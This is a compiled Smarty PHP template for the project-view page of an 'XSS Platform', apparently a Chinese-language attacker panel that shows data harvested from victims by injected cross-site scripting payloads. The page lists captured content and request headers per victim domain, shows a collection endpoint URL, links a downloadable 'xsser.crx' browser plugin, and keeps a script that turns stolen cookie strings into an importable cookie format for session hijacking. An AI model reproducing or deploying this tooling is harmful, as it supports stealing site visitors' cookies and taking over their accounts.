<?php /* Smarty version 2.6.26, created on 2014-07-04 18:16:22
         compiled from project_view.html */ ?>
<?php require_once(SMARTY_CORE_DIR . 'core.load_plugins.php');
smarty_core_load_plugins(array('plugins' => array(array('modifier', 'date_format', 'project_view.html', 154, false),)), $this); ?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>XSS Platform</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="<?php echo $this->_tpl_vars['url']['themePath']; ?>
/css/bootstrap.min.css">
<link rel="stylesheet" href="<?php echo $this->_tpl_vars['url']['themePath']; ?>
/css/bootstrap-theme.min.css">
<link rel="stylesheet" href="<?php echo $this->_tpl_vars['url']['themePath']; ?>
/css/css.css">
<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
<script src="http://www.bootstrapcdn.com/bootstrap/2.3.1/js/bootstrap.min.js"></script>
<?php echo '
<style>
#ul1 { margin:0; width:220px; overflow:scroll-x; word-break:break-all}
.ohidden ul { height:18px; overflow:hidden }
a.oall,a.un { text-decoration:none }
td { vertical-align:top }
</style>
<script type="text/javascript">
$(document).ready(function(){
	$("a.oall").click(function(){
		if($(this).attr("class")=="oall"){
			$("table tbody tr").attr("class","");
			$("a.un").html("-折叠");
			$(this).attr("class","uall");
			$(this).html("-全部");	
		}else{
			$("table tbody tr").attr("class","ohidden");
			$("a.un").html("+展开");
			$(this).attr("class","oall");
			$(this).html("+全部");	
		}
	});
	$("a.un").click(function(){
		if($(this).parent().parent().attr("class")=="ohidden"){
			$(this).parent().parent().attr("class","");
			$(this).html("-折叠");
		}else{
			$(this).parent().parent().attr("class","ohidden");
			$(this).html("+展开");	
		}
	});
});
function Delete(id,obj,token){
	if(confirm("确定删除吗?")){
		$.post(\'index.php?do=project&act=delcontent&r=\'+Math.random(),{\'id\':id,\'token\':token},function(re){
			if(re==1){
				$(obj).parent().parent().remove();
			}
		});
	}
}
function MutiDelete(){
	if(confirm("确定删除选中的内容吗?")){
		var ids=[];
		$.each($(".checon"),function(k,v){
			if($(v).is(":checked")) ids.push($(v).val());
		});
		$.post(\'index.php?do=project&act=delcontents&r=\'+Math.random(),{\'ids\':ids.join("|"),\'token\':$("#token").val()},function(re){
			if(re==1){
				$(".checon").parent().parent().remove();
			}
		});
	}
}
function CheckAll(obj){
	if($(obj).is(":checked")){
		$(".checon").attr("checked","checked");
	}else{
		$(".checon").removeAttr("checked");
	}
}
function Copy(obj) { 
  var table = $(obj).parent().parent(); 
  var l = table.find("#location").text(); 
  var c = table.find("#cookie").text(); 
  var t = l.split(\'//\')[1]; 
  t = t.split(\'/\')[0]; 
  var d = ""; 
  var t2 = t.split(\'.\'); 
  for (key in t2) { 
    if (key == 0) { 
      continue; 
    } 
    d = d + \'.\' + t2[key]; 
  }; 
  var arr = c.split(\';\'); 
  var data = []; 
  for (var key in arr) { 
    var arr2 = arr[key].split(\'=\'); 
    data.push(cookie(d,arr2[0], arr2[1])); 
  } 
  alert(JSON.stringify(data)); 
} 

function cookie(d,n,v) 
{ 
  var row ={     
    "domain" : d, 
    "expirationDate" : Math.round(new Date().getTime()/1000)+3600, 
    "hostOnly" : false, 
    "httpOnly" : false, 
    "name" : n.replace(/^\\s+|\\s+$/g,\'\'), 
    "path" : "\\/", 
    "secure" : false, 
    "session" : false, 
    "storeId" : "0", 
    "value" : v.replace(/^\\s+|\\s+$/g,\'\') 
    }; 
  return row; 
}
</script>
'; ?>

</head>
<body>
<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "header.html", 'smarty_include_vars' => array()));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
<div class="container">
<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "menus.html", 'smarty_include_vars' => array()));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
<div class="col-sm-9">
          <div class="panel panel-default">
    	<div class="panel-heading">项目内容<a style="font-size:12px; margin-left:10px; float:right;" href="<?php echo $this->_tpl_vars['url']['root']; ?>
/index.php?do=project&act=viewcode&id=<?php echo $this->_tpl_vars['project']['id']; ?>
">查看代码</a>
    	<a style="font-size:12px;float:right;" href="<?php echo $this->_tpl_vars['url']['root']; ?>
/index.php?do=project&act=setcode&id=<?php echo $this->_tpl_vars['project']['id']; ?>
">配置</a>
		</div>
<table class="table" border="0" cellspacing="0" cellpadding="0">
	<div style="padding: 10px 15px;">
    <h3>
    	项目名称: <?php echo $this->_tpl_vars['project']['title']; ?>

    </h3>
    Domain: 
    <select onchange="location.href='<?php echo $this->_tpl_vars['url']['root']; ?>
/index.php?do=project&act=view&id=<?php echo $this->_tpl_vars['project']['id']; ?>
&domain='+this.value">
    	<option value="">全部</option>
        <?php $_from = $this->_tpl_vars['domains']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['v']):
?>
        <option value="<?php echo $this->_tpl_vars['v']; ?>
"<?php if ($this->_tpl_vars['v'] == $this->_tpl_vars['domain']): ?> selected="selected"<?php endif; ?>><?php echo $this->_tpl_vars['v']; ?>
</option>
        <?php endforeach; endif; unset($_from); ?>
    </select> 
    <br />
    接口地址: <?php echo $this->_tpl_vars['url']['root']; ?>
/do/auth/<?php echo $this->_tpl_vars['project']['authCode']; ?>
 ( 加 /domain/xxx 可通过域名过滤内容) <a id="plugin" href="/xsser.crx" download><button class="btn btn-success">安装插件</button></a>
    </div>
	<thead>
		<tr>
			<th width="20"><input type="checkbox" id="checkall" onclick="CheckAll(this)" /></th>
        	<th width="60"><a href="javascript:void(0)" class="oall" style="font-weight:normal">+全部</a></th>
        	<th width="120">时间</th>
        	<th width="220">接收的内容</th>
			<th width="220">Request Headers</th>
            <th width="80">操作</th>
		</tr>
	</thead>
	<tbody>
		<?php $_from = $this->_tpl_vars['contents']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['v']):
?>
		<tr class="ohidden">
			<td><input type="checkbox" class="checon" value="<?php echo $this->_tpl_vars['v']['id']; ?>
" /></td>
        	<td><a href="javascript:void(0)" class="un">+展开</a></td>
        	<td><?php echo smarty_modifier_date_format($this->_tpl_vars['v']['addTime'], "%Y-%m-%d %H:%M:%S"); ?>
</td>
			<td>
                <ul id="ul1">
                <?php $_from = $this->_tpl_vars['v']['content']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['ck'] => $this->_tpl_vars['c']):
?>
                <li><?php echo $this->_tpl_vars['ck']; ?>
 : <?php echo $this->_tpl_vars['c']; ?>
</li>
                <?php endforeach; endif; unset($_from); ?>	
                </ul>
            </td>
            <td>
                <ul id="ul1">
                <?php $_from = $this->_tpl_vars['v']['serverContent']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['sk'] => $this->_tpl_vars['s']):
?>
                <li><?php echo $this->_tpl_vars['sk']; ?>
 : <?php echo $this->_tpl_vars['s']; ?>
</li>
                <?php endforeach; endif; unset($_from); ?>	
                </ul>
            </td>
            <td><a href="javascript:void(0)" onclick="Delete('<?php echo $this->_tpl_vars['v']['id']; ?>
',this,'<?php echo $this->_tpl_vars['show']['user']['token']; ?>
')">删除</a>
			<!--
			&nbsp;&nbsp;<a href="javascript:void(0)" onclick="Copy(this)">复制</a> 
			-->
			</td>
		</tr>
		<?php endforeach; endif; unset($_from); ?>
	</tbody>
</table>
<div style="padding:5px 10px">选中项操作：<a href="javascript:void(0)" onclick="MutiDelete()">删除</a></div>
</div>
</div>
</div>
<input type="hidden" id="token" value="<?php echo $this->_tpl_vars['show']['user']['token']; ?>
" />
</body>
</html>